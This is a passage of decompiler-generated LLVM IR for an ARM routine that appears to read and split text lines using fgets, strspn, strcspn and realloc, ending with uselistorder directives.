  store i32 %v2_1542c, i32* %v3_15430, align 4
  %v0_15434 = load i32, i32* @fp, align 4
  store i32 %v0_15434, i32* @r6, align 4
  br label %dec_label_pc_15438

dec_label_pc_15438:                               ; preds = %dec_label_pc_154c4, %dec_label_pc_154b0, %dec_label_pc_15428
  %v0_15440 = phi i32 [ %v0_15434, %dec_label_pc_15428 ], [ %v1_154b0, %dec_label_pc_154b0 ], [ %v0_15440.pre.pre, %dec_label_pc_154c4 ]
  %v0_15438 = load i32, i32* @r5, align 4
  %v1_15438 = add i32 %v0_15438, 12
  store i32 %v1_15438, i32* %r0.global-to-local, align 4
  %v1_1543c = inttoptr i32 %v1_15438 to i32*
  %v2_1543c = load i32, i32* %v1_1543c, align 4
  store i32 %v2_1543c, i32* %r0.global-to-local, align 4
  %v3_1543c = add i32 %v0_15438, 16
  %v4_1543c = inttoptr i32 %v3_1543c to i32*
  %v5_1543c = load i32, i32* %v4_1543c, align 4
  %v2_15440 = add i32 %v2_1543c, %v0_15440
  store i32 %v2_15440, i32* %r0.global-to-local, align 4
  %v2_15444 = sub i32 %v5_1543c, %v0_15440
  %v1_15448 = inttoptr i32 %v0_15438 to i32*
  %v2_15448 = load i32, i32* %v1_15448, align 4
  store i32 %v2_15448, i32* %r2.global-to-local, align 4
  %v3_1544c = call i32 @fgets(i32 %v2_15440, i32 %v2_15444, i32 %v2_15448)
  store i32 %v3_1544c, i32* %r0.global-to-local, align 4
  store i32 %v3_1544c, i32* %r4.global-to-local, align 4
  %v2_15450 = icmp eq i32 %v3_1544c, 0
  store i1 %v2_15450, i1* %cpsr_z.global-to-local, align 1
  %v0_15458 = load i32, i32* @r5, align 4
  %v1_15458 = add i32 %v0_15458, 12
  br i1 %v2_15450, label %dec_label_pc_15458, label %dec_label_pc_15470

dec_label_pc_15458:                               ; preds = %dec_label_pc_15438
  store i32 %v1_15458, i32* %r0.global-to-local, align 4
  %v1_1545c = inttoptr i32 %v1_15458 to i32*
  %v2_1545c = load i32, i32* %v1_1545c, align 4
  store i32 %v2_1545c, i32* %r0.global-to-local, align 4
  %v3_1545c = add i32 %v0_15458, 16
  %v4_1545c = inttoptr i32 %v3_1545c to i32*
  %v5_1545c = load i32, i32* %v4_1545c, align 4
  store i32 %v5_1545c, i32* %r2.global-to-local, align 4
  %v3_15464 = inttoptr i32 %v2_1545c to i8*
  %v4_15464 = call i32 @__GI_memset(i8* %v3_15464, i32 0, i32 %v5_1545c)
  store i32 %v4_15464, i32* %r0.global-to-local, align 4
  %v0_15468 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15688

dec_label_pc_15470:                               ; preds = %dec_label_pc_15438
  %v2_15470 = inttoptr i32 %v1_15458 to i32*
  %v3_15470 = load i32, i32* %v2_15470, align 4
  store i32 %v3_15470, i32* @r4, align 4
  %v1_15474 = load i32, i32* @r6, align 4
  %v2_15474 = add i32 %v1_15474, %v3_15470
  %v3_15474 = inttoptr i32 %v2_15474 to i8*
  store i32 %v2_15474, i32* %r0.global-to-local, align 4
  %v3_15478 = call i32 @strlen(i8* %v3_15474)
  %v0_15480 = load i32, i32* @r6, align 4
  %v2_15480 = add i32 %v0_15480, %v3_15478
  store i32 %v2_15480, i32* @r6, align 4
  %v0_15484 = load i32, i32* @r4, align 4
  store i32 %v0_15484, i32* @r0, align 4
  %v2_15488 = call i32 @__GI_strchr(i32 %v0_15484, i32 10)
  store i32 %v2_15488, i32* %r0.global-to-local, align 4
  %v2_1548c = icmp eq i32 %v2_15488, 0
  store i1 %v2_1548c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1548c, label %dec_label_pc_154b8, label %dec_label_pc_15494

dec_label_pc_15494:                               ; preds = %dec_label_pc_15470
  %v1_15494 = inttoptr i32 %v2_15488 to i8*
  %v2_15494 = load i8, i8* %v1_15494, align 1
  %v3_15494 = zext i8 %v2_15494 to i32
  %v1_15498 = add nuw nsw i32 %v3_15494, 255
  %v1_1549c = urem i32 %v1_15498, 256
  store i32 %v1_1549c, i32* %r3.global-to-local, align 4
  %v7_154a0 = icmp eq i32 %v1_1549c, 92
  store i1 %v7_154a0, i1* %cpsr_z.global-to-local, align 1
  %v1_154a4 = trunc i32 %v1_15498 to i8
  store i8 %v1_154a4, i8* %v1_15494, align 1
  %v0_154a8 = load i32, i32* @r6, align 4
  %v1_154a8 = add i32 %v0_154a8, -1
  store i32 %v1_154a8, i32* @r6, align 4
  %v0_154ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_154ac, label %dec_label_pc_154b0, label %dec_label_pc_1553c

dec_label_pc_154b0:                               ; preds = %dec_label_pc_15494
  %v1_154b0 = add i32 %v0_154a8, -2
  store i32 %v1_154b0, i32* @r6, align 4
  br label %dec_label_pc_15438

dec_label_pc_154b8:                               ; preds = %dec_label_pc_15470
  %v0_154b8 = load i32, i32* @r5, align 4
  %v1_154b8 = add i32 %v0_154b8, 20
  %v2_154b8 = inttoptr i32 %v1_154b8 to i32*
  %v3_154b8 = load i32, i32* %v2_154b8, align 4
  store i32 %v3_154b8, i32* %r3.global-to-local, align 4
  %v2_154bc = icmp eq i32 %v3_154b8, 0
  store i1 %v2_154bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_154bc, label %dec_label_pc_154f4, label %dec_label_pc_154c4

dec_label_pc_154c4:                               ; preds = %dec_label_pc_154b8
  %v1_154c4 = add i32 %v0_154b8, 16
  %v2_154c4 = inttoptr i32 %v1_154c4 to i32*
  %v3_154c4 = load i32, i32* %v2_154c4, align 4
  store i32 %v3_154c4, i32* %r3.global-to-local, align 4
  %v1_154c8 = add i32 %v0_154b8, 8
  %v2_154c8 = inttoptr i32 %v1_154c8 to i32*
  %v3_154c8 = load i32, i32* %v2_154c8, align 4
  %v1_154cc = add i32 %v3_154c4, 4096
  store i32 %v1_154cc, i32* %r3.global-to-local, align 4
  %v2_154d0 = add i32 %v3_154c8, %v1_154cc
  store i32 %v1_154cc, i32* %v2_154c4, align 4
  %v0_154d8 = load i32, i32* @r5, align 4
  %v1_154d8 = add i32 %v0_154d8, 4
  %v2_154d8 = inttoptr i32 %v1_154d8 to i32*
  %v3_154d8 = load i32, i32* %v2_154d8, align 4
  store i32 %v3_154d8, i32* %r0.global-to-local, align 4
  %v4_154dc = inttoptr i32 %v3_154d8 to i32*
  %v5_154dc = call i32 @realloc(i32* %v4_154dc, i32 %v2_154d0, i32 %v2_15448, i32 %v1_154cc)
  store i32 %v5_154dc, i32* %r0.global-to-local, align 4
  %v0_154e0 = load i32, i32* @r5, align 4
  %v1_154e0 = add i32 %v0_154e0, 8
  %v2_154e0 = inttoptr i32 %v1_154e0 to i32*
  %v3_154e0 = load i32, i32* %v2_154e0, align 4
  %v2_154e4 = add i32 %v3_154e0, %v5_154dc
  store i32 %v2_154e4, i32* %r3.global-to-local, align 4
  %v2_154e8 = add i32 %v0_154e0, 12
  %v3_154e8 = inttoptr i32 %v2_154e8 to i32*
  store i32 %v2_154e4, i32* %v3_154e8, align 4
  %v1_154ec = load i32, i32* @r5, align 4
  %v2_154ec = add i32 %v1_154ec, 4
  %v3_154ec = inttoptr i32 %v2_154ec to i32*
  store i32 %v5_154dc, i32* %v3_154ec, align 4
  %v0_15440.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15438

dec_label_pc_154f4:                               ; preds = %dec_label_pc_154b8, %.dec_label_pc_154f4_crit_edge
  %v0_154f4 = phi i32 [ %v0_154f4.pre, %.dec_label_pc_154f4_crit_edge ], [ %v0_154b8, %dec_label_pc_154b8 ]
  %v1_154f4 = inttoptr i32 %v0_154f4 to i32*
  %v2_154f4 = load i32, i32* %v1_154f4, align 4
  store i32 %v2_154f4, i32* @r1, align 4
  %v1_154f8 = add i32 %v2_154f4, 52
  %v2_154f8 = inttoptr i32 %v1_154f8 to i32*
  %v3_154f8 = load i32, i32* %v2_154f8, align 4
  store i32 %v3_154f8, i32* %r3.global-to-local, align 4
  %v2_154fc = icmp eq i32 %v3_154f8, 0
  store i1 %v2_154fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_154fc, label %dec_label_pc_15528, label %dec_label_pc_15504

dec_label_pc_15504:                               ; preds = %dec_label_pc_154f4
  %v1_15504 = add i32 %v2_154f4, 16
  %v2_15504 = inttoptr i32 %v1_15504 to i32*
  %v3_15504 = load i32, i32* %v2_15504, align 4
  store i32 %v3_15504, i32* %r2.global-to-local, align 4
  %v1_15508 = add i32 %v2_154f4, 24
  %v2_15508 = inttoptr i32 %v1_15508 to i32*
  %v3_15508 = load i32, i32* %v2_15508, align 4
  store i32 %v3_15508, i32* %r3.global-to-local, align 4
  %v3_1550c = icmp ult i32 %v3_15504, %v3_15508
  %v9_1550c = icmp eq i32 %v3_15504, %v3_15508
  store i1 %v9_1550c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1550c, label %dec_label_pc_15530thread-pre-split, label %dec_label_pc_1551c

dec_label_pc_1551c:                               ; preds = %dec_label_pc_15504
  store i32 %v2_154f4, i32* %r0.global-to-local, align 4
  %v1_15520 = inttoptr i32 %v2_154f4 to i16*
  %v2_15520 = call i32 @getc_unlocked(i16* %v1_15520)
  store i32 %v2_15520, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15530

dec_label_pc_15528:                               ; preds = %dec_label_pc_154f4
  store i32 %v2_154f4, i32* %r0.global-to-local, align 4
  %v1_1552c = call i32 @__GI_fgetc(i32 %v2_154f4)
  store i32 %v1_1552c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15530

dec_label_pc_15530thread-pre-split:               ; preds = %dec_label_pc_15504
  %v2_15510 = inttoptr i32 %v3_15504 to i8*
  %v3_15510 = load i8, i8* %v2_15510, align 1
  %v4_15510 = zext i8 %v3_15510 to i32
  store i32 %v4_15510, i32* %r0.global-to-local, align 4
  %v6_15510 = add i32 %v3_15504, 1
  store i32 %v6_15510, i32* %r2.global-to-local, align 4
  store i32 %v6_15510, i32* %v2_15504, align 4
  %v0_15530.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15530

dec_label_pc_15530:                               ; preds = %dec_label_pc_15530thread-pre-split, %dec_label_pc_1551c, %dec_label_pc_15528
  %v1_15534 = phi i32 [ %v0_15530.pr, %dec_label_pc_15530thread-pre-split ], [ %v2_15520, %dec_label_pc_1551c ], [ %v1_1552c, %dec_label_pc_15528 ]
  %v7_15530 = icmp eq i32 %v1_15534, 10
  store i1 %v7_15530, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15530, label %dec_label_pc_1553c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_15530
  %v8_15534 = icmp eq i32 %v1_15534, -1
  store i1 %v8_15534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15534, label %dec_label_pc_1553c.loopexit, label %.dec_label_pc_154f4_crit_edge

.dec_label_pc_154f4_crit_edge:                    ; preds = %bb66
  %v0_154f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_154f4

dec_label_pc_1553c.loopexit:                      ; preds = %bb66, %dec_label_pc_15530
  %v0_1553c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1553c

dec_label_pc_1553c:                               ; preds = %dec_label_pc_15494, %dec_label_pc_1553c.loopexit
  %v0_1553c = phi i32 [ %v0_1553c.pre, %dec_label_pc_1553c.loopexit ], [ %v1_154a8, %dec_label_pc_15494 ]
  %v7_1553c = icmp eq i32 %v0_1553c, -1
  store i1 %v7_1553c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1553c, label %dec_label_pc_15684, label %dec_label_pc_15544

dec_label_pc_15544:                               ; preds = %dec_label_pc_1553c
  store i32 %v1_153ac, i32* %r3.global-to-local, align 4
  store i1 %v2_15548, i1* %cpsr_z.global-to-local, align 1
  %v0_1554c = load i32, i32* @r5, align 4
  %v1_1554c = add i32 %v0_1554c, 12
  %v2_1554c = inttoptr i32 %v1_1554c to i32*
  %v3_1554c = load i32, i32* %v2_1554c, align 4
  store i32 %v3_1554c, i32* @r4, align 4
  br i1 %v2_15548, label %dec_label_pc_15564, label %dec_label_pc_15554

dec_label_pc_15554:                               ; preds = %dec_label_pc_15544
  store i32 %v3_1554c, i32* @r0, align 4
  %v0_15558 = load i32, i32* @sl, align 4
  %v2_1555c = inttoptr i32 %v3_1554c to i8*
  %v3_1555c = call i32 @__GI_strspn(i8* %v2_1555c, i32 %v0_15558)
  store i32 %v3_1555c, i32* %r0.global-to-local, align 4
  %v0_15560 = load i32, i32* @r4, align 4
  %v2_15560 = add i32 %v0_15560, %v3_1555c
  store i32 %v2_15560, i32* @r4, align 4
  br label %dec_label_pc_15564

dec_label_pc_15564:                               ; preds = %dec_label_pc_15544, %dec_label_pc_15554
  %v0_15564 = phi i32 [ %v3_1554c, %dec_label_pc_15544 ], [ %v2_15560, %dec_label_pc_15554 ]
  %v1_15564 = inttoptr i32 %v0_15564 to i8*
  %v2_15564 = load i8, i8* %v1_15564, align 1
  %v3_15564 = zext i8 %v2_15564 to i32
  store i32 %v3_15564, i32* %r2.global-to-local, align 4
  %v2_15568 = icmp eq i8 %v2_15564, 0
  store i1 %v2_15568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15568, label %dec_label_pc_153d4.backedge, label %dec_label_pc_15570

dec_label_pc_153d4.backedge:                      ; preds = %dec_label_pc_15564, %dec_label_pc_15570, %dec_label_pc_1567c
  %v0_153d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_153d4

dec_label_pc_15570:                               ; preds = %dec_label_pc_15564
  %v0_15570 = load i32, i32* @r7, align 4
  %v1_15570 = inttoptr i32 %v0_15570 to i8*
  %v2_15570 = load i8, i8* %v1_15570, align 1
  %v3_15570 = zext i8 %v2_15570 to i32
  store i32 %v3_15570, i32* %r3.global-to-local, align 4
  %v9_15574 = icmp eq i8 %v2_15570, %v2_15564
  store i1 %v9_15574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15574, label %dec_label_pc_153d4.backedge, label %dec_label_pc_1557c

dec_label_pc_1557c:                               ; preds = %dec_label_pc_15570
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_15580 = load i32, i32* @r5, align 4
  %v1_15580 = add i32 %v0_15580, 4
  %v2_15580 = inttoptr i32 %v1_15580 to i32*
  %v3_15580 = load i32, i32* %v2_15580, align 4
  store i32 %v3_15580, i32* %r0.global-to-local, align 4
  %v0_15584 = load i32, i32* @fp, align 4
  store i32 %v3_15580, i32* %v1_155a0, align 4
  store i32 %v3_15398, i32* %r2.global-to-local, align 4
  %v3_15590 = inttoptr i32 %v3_15580 to i8*
  %v4_15590 = call i32 @__GI_memset(i8* %v3_15590, i32 %v0_15584, i32 %v3_15398)
  store i32 %v4_15590, i32* %r0.global-to-local, align 4
  %v0_15594 = load i32, i32* @fp, align 4
  store i32 %v0_15594, i32* @r6, align 4
  %v0_1565412 = load i32, i32* @r4, align 4
  %v1_1565413 = inttoptr i32 %v0_1565412 to i8*
  %v2_1565414 = load i8, i8* %v1_1565413, align 1
  %v3_1565415 = zext i8 %v2_1565414 to i32
  store i32 %v3_1565415, i32* %r2.global-to-local, align 4
  %v2_1565816 = icmp eq i8 %v2_1565414, 0
  store i1 %v2_1565816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1565816, label %dec_label_pc_15670, label %dec_label_pc_15660

dec_label_pc_1559c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_155a0 = load i32, i32* %v1_155a0, align 4
  store i32 %v2_155a0, i32* %r3.global-to-local, align 4
  store i32 %v1_153b0, i32* %r2.global-to-local, align 4
  %v9_155a8 = icmp eq i32 %v2_155ac, %v1_153b0
  store i1 %v9_155a8, i1* %cpsr_z.global-to-local, align 1
  %v5_155ac = mul i32 %v2_155ac, 4
  %v6_155ac = add i32 %v2_155a0, %v5_155ac
  %v7_155ac = inttoptr i32 %v6_155ac to i32*
  store i32 %v0_155ac, i32* %v7_155ac, align 4
  br i1 %v9_155a8, label %dec_label_pc_155b4, label %dec_label_pc_155c0

dec_label_pc_155b4:                               ; preds = %dec_label_pc_1559c
  store i32 %v1_153bc, i32* %r3.global-to-local, align 4
  store i1 %v2_155b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_155b8, label %dec_label_pc_155c0, label %dec_label_pc_155e0

dec_label_pc_155c0:                               ; preds = %dec_label_pc_155b4, %dec_label_pc_1559c
  %v0_155c0 = load i32, i32* @r7, align 4
  %v1_155c0 = inttoptr i32 %v0_155c0 to i8*
  %v2_155c0 = load i8, i8* %v1_155c0, align 1
  %v3_155c0 = zext i8 %v2_155c0 to i32
  store i32 %v3_155c0, i32* %r3.global-to-local, align 4
  %v2_155c4 = icmp eq i8 %v2_155c0, 0
  store i1 %v2_155c4, i1* %cpsr_z.global-to-local, align 1
  %v0_155c8 = load i32, i32* @r4, align 4
  store i32 %v0_155c8, i32* @r0, align 4
  %v1_155cc = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_155c4, i32 %v1_155cc, i32 %v0_155c0
  store i32 %storemerge, i32* @r1, align 4
  %v0_155d4 = call i32 @strcspn()
  store i32 %v0_155d4, i32* %r0.global-to-local, align 4
  %v0_155d8 = load i32, i32* @r4, align 4
  %v2_155d8 = add i32 %v0_155d8, %v0_155d4
  store i32 %v2_155d8, i32* @r4, align 4
  br label %dec_label_pc_15618

dec_label_pc_155e0:                               ; preds = %dec_label_pc_155b4
  %v0_155e0 = load i32, i32* @r4, align 4
  store i32 %v0_155e0, i32* @r0, align 4
  %v0_155e4 = load i32, i32* @r7, align 4
  %v1_155e4 = inttoptr i32 %v0_155e4 to i8*
  %v2_155e4 = load i8, i8* %v1_155e4, align 1
  %v3_155e4 = zext i8 %v2_155e4 to i32
  %v5_155e8 = call i32 @__GI_strchrnul(i32 %v0_155e0, i32 %v3_155e4, i32 %v1_153b0, i32 %v1_153bc)
  store i32 %v5_155e8, i32* %r0.global-to-local, align 4
  store i32 %v1_153ac, i32* %r2.global-to-local, align 4
  store i1 %v2_15548, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_155e8, i32* @r4, align 4
  br i1 %v2_15548, label %dec_label_pc_15618, label %dec_label_pc_15604

dec_label_pc_15600:                               ; preds = %dec_label_pc_15604
  %v1_15600 = add i32 %v0_15618.pre, -1
  store i32 %v1_15600, i32* @r4, align 4
  br label %dec_label_pc_15604

dec_label_pc_15604:                               ; preds = %dec_label_pc_155e0, %dec_label_pc_15600
  %v0_15604 = phi i32 [ %v1_15600, %dec_label_pc_15600 ], [ %v5_155e8, %dec_label_pc_155e0 ]
  %v1_15604 = add i32 %v0_15604, -1
  %v2_15604 = inttoptr i32 %v1_15604 to i8*
  %v3_15604 = load i8, i8* %v2_15604, align 1
  %v4_15604 = zext i8 %v3_15604 to i32
  %v0_15608 = load i32, i32* @sl, align 4
  store i32 %v0_15608, i32* @r0, align 4
  %v2_1560c = call i32 @__GI_strchr(i32 %v0_15608, i32 %v4_15604)
  store i32 %v2_1560c, i32* %r0.global-to-local, align 4
  %v2_15610 = icmp eq i32 %v2_1560c, 0
  store i1 %v2_15610, i1* %cpsr_z.global-to-local, align 1
  %v0_15618.pre = load i32, i32* @r4, align 4
  br i1 %v2_15610, label %dec_label_pc_15618, label %dec_label_pc_15600

dec_label_pc_15618:                               ; preds = %dec_label_pc_15604, %dec_label_pc_155e0, %dec_label_pc_155c0
  %v3_15624 = phi i32 [ %v5_155e8, %dec_label_pc_155e0 ], [ %v2_155d8, %dec_label_pc_155c0 ], [ %v0_15618.pre, %dec_label_pc_15604 ]
  %v1_15618 = inttoptr i32 %v3_15624 to i8*
  %v2_15618 = load i8, i8* %v1_15618, align 1
  %v3_15618 = zext i8 %v2_15618 to i32
  store i32 %v3_15618, i32* %r2.global-to-local, align 4
  %v0_1561c = load i32, i32* @r7, align 4
  %v1_1561c = inttoptr i32 %v0_1561c to i8*
  %v2_1561c = load i8, i8* %v1_1561c, align 1
  %v3_1561c = zext i8 %v2_1561c to i32
  store i32 %v3_1561c, i32* %r3.global-to-local, align 4
  %v9_15620 = icmp eq i8 %v2_1561c, %v2_15618
  store i1 %v9_15620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15620, label %bb69, label %dec_label_pc_1562c

bb69:                                             ; preds = %dec_label_pc_15618
  %v1_15624 = load i32, i32* @fp, align 4
  %v2_15624 = trunc i32 %v1_15624 to i8
  store i8 %v2_15624, i8* %v1_15618, align 1
  %v0_15628.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15628.pr, label %bb71, label %.dec_label_pc_1562c_crit_edge

.dec_label_pc_1562c_crit_edge:                    ; preds = %bb69
  %v0_1562c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1562c

dec_label_pc_1562c:                               ; preds = %.dec_label_pc_1562c_crit_edge, %dec_label_pc_15618
  %v0_1562c = phi i32 [ %v0_1562c.pre, %.dec_label_pc_1562c_crit_edge ], [ %v3_15618, %dec_label_pc_15618 ]
  %v2_1562c = icmp eq i32 %v0_1562c, 0
  store i1 %v2_1562c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1562c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_1562c
  %v1_15630 = load i32, i32* @fp, align 4
  %v2_15630 = trunc i32 %v1_15630 to i8
  %v3_15630 = load i32, i32* @r4, align 4
  %v4_15630 = inttoptr i32 %v3_15630 to i8*
  store i8 %v2_15630, i8* %v4_15630, align 1
  %v5_15630 = load i32, i32* @r4, align 4
  %v6_15630 = add i32 %v5_15630, 1
  store i32 %v6_15630, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_1562c, %bb70
  %v2_15634 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_15634, i32* %r3.global-to-local, align 4
  %v2_15638 = icmp eq i32 %v2_15634, 0
  store i1 %v2_15638, i1* %cpsr_z.global-to-local, align 1
  %v0_15654.pre = load i32, i32* @r4, align 4
  br i1 %v2_15638, label %dec_label_pc_15650, label %dec_label_pc_15640

dec_label_pc_15640:                               ; preds = %bb71
  store i32 %v0_15654.pre, i32* @r0, align 4
  %v0_15644 = load i32, i32* @sl, align 4
  %v2_15648 = inttoptr i32 %v0_15654.pre to i8*
  %v3_15648 = call i32 @__GI_strspn(i8* %v2_15648, i32 %v0_15644)
  store i32 %v3_15648, i32* %r0.global-to-local, align 4
  %v0_1564c = load i32, i32* @r4, align 4
  %v2_1564c = add i32 %v0_1564c, %v3_15648
  store i32 %v2_1564c, i32* @r4, align 4
  br label %dec_label_pc_15650

dec_label_pc_15650:                               ; preds = %bb71, %dec_label_pc_15640
  %v0_15654 = phi i32 [ %v2_1564c, %dec_label_pc_15640 ], [ %v0_15654.pre, %bb71 ]
  %v0_15650 = load i32, i32* @r6, align 4
  %v1_15650 = add i32 %v0_15650, 1
  store i32 %v1_15650, i32* @r6, align 4
  %v1_15654 = inttoptr i32 %v0_15654 to i8*
  %v2_15654 = load i8, i8* %v1_15654, align 1
  %v3_15654 = zext i8 %v2_15654 to i32
  store i32 %v3_15654, i32* %r2.global-to-local, align 4
  %v2_15658 = icmp eq i8 %v2_15654, 0
  store i1 %v2_15658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15658, label %dec_label_pc_15670, label %dec_label_pc_15660

dec_label_pc_15660:                               ; preds = %dec_label_pc_1557c, %dec_label_pc_15650
  %v0_155ac = phi i32 [ %v0_15654, %dec_label_pc_15650 ], [ %v0_1565412, %dec_label_pc_1557c ]
  %v2_155ac = phi i32 [ %v1_15650, %dec_label_pc_15650 ], [ %v0_15594, %dec_label_pc_1557c ]
  %v1_15664 = phi i32 [ %v3_15654, %dec_label_pc_15650 ], [ %v3_1565415, %dec_label_pc_1557c ]
  %v0_15660 = load i32, i32* @r7, align 4
  %v1_15660 = inttoptr i32 %v0_15660 to i8*
  %v2_15660 = load i8, i8* %v1_15660, align 1
  %v3_15660 = zext i8 %v2_15660 to i32
  store i32 %v3_15660, i32* %r3.global-to-local, align 4
  %v9_15664 = icmp eq i32 %v3_15660, %v1_15664
  store i1 %v9_15664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15664, label %dec_label_pc_15670, label %bb72

bb72:                                             ; preds = %dec_label_pc_15660
  %v2_15668 = load i32, i32* @sb, align 4
  %v3_15668 = sub i32 %v2_155ac, %v2_15668
  %v5_15668 = xor i32 %v2_15668, %v2_155ac
  %v6_15668 = xor i32 %v3_15668, %v2_155ac
  %v7_15668 = and i32 %v6_15668, %v5_15668
  %v8_15668 = icmp slt i32 %v7_15668, 0
  %v9_15668 = icmp slt i32 %v3_15668, 0
  %v10_15668 = icmp eq i32 %v2_155ac, %v2_15668
  store i1 %v10_15668, i1* %cpsr_z.global-to-local, align 1
  %v2_1566c = xor i1 %v9_15668, %v8_15668
  br i1 %v2_1566c, label %dec_label_pc_1559c, label %dec_label_pc_15670

dec_label_pc_15670:                               ; preds = %dec_label_pc_15660, %dec_label_pc_15650, %bb72, %dec_label_pc_1557c
  %v0_15674 = phi i32 [ %v0_15594, %dec_label_pc_1557c ], [ %v2_155ac, %dec_label_pc_15660 ], [ %v1_15650, %dec_label_pc_15650 ], [ %v2_155ac, %bb72 ]
  store i32 %v3_15394, i32* %r2.global-to-local, align 4
  %v9_15674 = icmp eq i32 %v0_15674, %v3_15394
  store i1 %v9_15674, i1* %cpsr_z.global-to-local, align 1
  %v6_15678 = icmp slt i32 %v0_15674, %v3_15394
  br i1 %v6_15678, label %dec_label_pc_1567c, label %dec_label_pc_15688

dec_label_pc_1567c:                               ; preds = %dec_label_pc_15670
  %v0_1567c = load i32, i32* @r8, align 4
  %v1_1567c = and i32 %v0_1567c, 1048576
  %v2_1567c = icmp eq i32 %v1_1567c, 0
  store i1 %v2_1567c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1567c, label %dec_label_pc_153d4.backedge, label %dec_label_pc_15684

dec_label_pc_15684:                               ; preds = %dec_label_pc_1567c, %dec_label_pc_1553c, %.thread, %entry
  br label %dec_label_pc_15688

dec_label_pc_15688:                               ; preds = %dec_label_pc_15670, %dec_label_pc_15458, %dec_label_pc_15684
  %v0_15688 = phi i32 [ %v0_15468, %dec_label_pc_15458 ], [ 0, %dec_label_pc_15684 ], [ %v0_15674, %dec_label_pc_15670 ]
  store i32 %v0_15688, i32* %r0.global-to-local, align 4
  store i32 %v3_15370, i32* @r4, align 4
  store i32 %v6_15370, i32* @r5, align 4
  store i32 %v9_15370, i32* @r6, align 4
  store i32 %v12_15370, i32* @r7, align 4
  store i32 %v15_15370, i32* @r8, align 4
  store i32 %v18_15370, i32* @sb, align 4
  store i32 %v21_15370, i32* @sl, align 4
  store i32 %v24_15370, i32* @fp, align 4
  ret i32 %v0_15688

; uselistorder directives
  uselistorder i32 %v0_15688, { 1, 0 }
  uselistorder i32 %v0_15674, { 0, 2, 1 }
  uselistorder i32 %v3_15668, { 1, 0 }
  uselistorder i32 %v2_15668, { 1, 0, 2 }
  uselistorder i32 %v2_155ac, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_15654.pre, { 0, 2, 1 }
  uselistorder i32 %v5_155e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15594, { 1, 0, 2 }
  uselistorder i1 %v9_15574, { 1, 0 }
  uselistorder i32 %v3_1554c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1553c, { 1, 0 }
  uselistorder i1 %v8_15534, { 1, 0 }
  uselistorder i32 %v3_15504, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_154f4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_154dc, { 1, 0, 2 }
  uselistorder i32 %v1_154cc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_154b8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_154b0, { 1, 0 }
  uselistorder i32 %v1_1549c, { 1, 0 }
  uselistorder i32 %v1_15498, { 1, 0 }
  uselistorder i32 %v2_15474, { 1, 0 }
  uselistorder i32 %v1_15458, { 2, 0, 1 }
  uselistorder i32 %v0_15440, { 1, 0 }
  uselistorder i32 %v1_15430, { 0, 2, 1 }
  uselistorder i32* %v1_155a0, { 1, 0 }
  uselistorder i1 %v2_15548, { 1, 0, 2, 3 }
  uselistorder i32 %v1_153bc, { 2, 0, 1, 3 }
  uselistorder i32 %v1_153b0, { 2, 1, 0 }
  uselistorder i32 %v3_15398, { 1, 2, 0 }
  uselistorder i32 %v3_15394, { 2, 1, 0 }
  uselistorder i32 %v1_1538c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 2, 1, 3, 0 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
